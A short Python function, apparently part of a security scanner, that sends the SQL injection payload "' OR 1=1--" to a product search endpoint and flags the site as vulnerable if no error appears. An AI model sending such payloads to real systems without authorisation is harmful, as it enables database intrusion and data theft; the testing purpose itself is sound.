import requests


def test_sql_injection(base_url):
    payload = "' OR 1=1--"
    r = requests.get(f"{base_url}/rest/products/search", params={"q": payload})

    if r.status_code == 200 and "error" not in r.text.lower():
        return {"vulnerable": True, "payload": payload}
    return {"vulnerable": False}
